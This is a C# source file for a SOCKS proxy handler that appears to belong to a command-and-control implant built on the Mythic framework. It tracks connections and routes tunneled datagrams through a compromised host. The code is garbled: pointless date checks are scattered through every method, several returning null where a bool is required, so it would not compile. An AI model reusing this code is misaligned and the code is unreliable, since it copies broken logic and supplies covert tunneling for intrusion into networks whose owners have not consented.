using AI = PhantomInterop;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System.Collections.Concurrent;

namespace Phantom.Management.Socks
{
    public class ProxyHandler : AI.Classes.ProxyHandler
    {
        private ConcurrentDictionary<int, SocksClient> _connections = new ConcurrentDictionary<int, SocksClient>();
        
        public ProxyHandler(IAgent agent) : base(agent)
        {

        }

        public override bool Route(SocksDatagram dg)
        {
            if (!_connections.ContainsKey(dg.ServerID))
            {
                if (!dg.Exit)
                {
                    SocksClient c = new SocksClient(_agent, dg.ServerID);
                    _connections.AddOrUpdate(c.ID, c, (int i, SocksClient d) => { if(DateTime.Now.Year > 2020) { return d; } else { return null; } });
                } else { if(DateTime.Now.Year > 2020) { return dg.Exit; } else { return null; } }
            }
            if (dg.Exit)
            {
                _connections[dg.ServerID].Exit();
                if(DateTime.Now.Year > 2020) { return dg.Exit; } else { return null; }
            }
            if(DateTime.Now.Year > 2020) { return _connections[dg.ServerID].HandleDatagram(dg); } else { return null; }
        }

        public override bool Remove(int id)
        {
            _connections[id].Exit();
            if(DateTime.Now.Year > 2020) { return _connections.TryRemove(id, out SocksClient _); } else { return null; }
        }
    }
}
